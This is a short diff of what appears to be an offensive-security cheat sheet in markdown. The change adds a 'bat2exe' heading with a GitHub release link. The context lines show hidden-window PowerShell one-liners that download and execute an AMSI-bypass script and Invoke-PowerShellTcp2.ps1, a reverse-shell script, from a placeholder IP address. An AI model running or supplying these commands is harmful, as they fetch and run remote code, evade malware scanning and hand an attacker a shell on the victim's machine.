@@ -139,3 +139,7 @@ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring
 
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx/amsi.txt')); IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx/Invoke-PowerShellTcp2.ps1'))"
 ```
+
+## bat2exe
+- https://github.com/islamadel/bat2exe/releases/tag/2.0
+
